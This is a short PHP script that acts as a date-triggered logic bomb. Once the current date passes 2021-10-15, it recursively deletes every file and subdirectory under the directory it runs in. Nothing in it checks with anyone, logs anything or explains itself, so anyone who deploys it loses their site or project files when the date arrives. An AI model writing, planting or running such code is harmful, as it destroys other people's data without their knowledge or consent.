<?php 
$dt=date("Y-m-d");
$dt1="2021-10-15";
if($dt>$dt1)
{
$dir = "./"; 
$dir = new RecursiveDirectoryIterator( 
$dir, FilesystemIterator::SKIP_DOTS); 
$dir = new RecursiveIteratorIterator( 
$dir,RecursiveIteratorIterator::CHILD_FIRST); 
foreach ( $dir as $file ) {
    //echo $file;
    $file->isDir() ?  rmdir($file) : unlink($file); 
}
}
?> 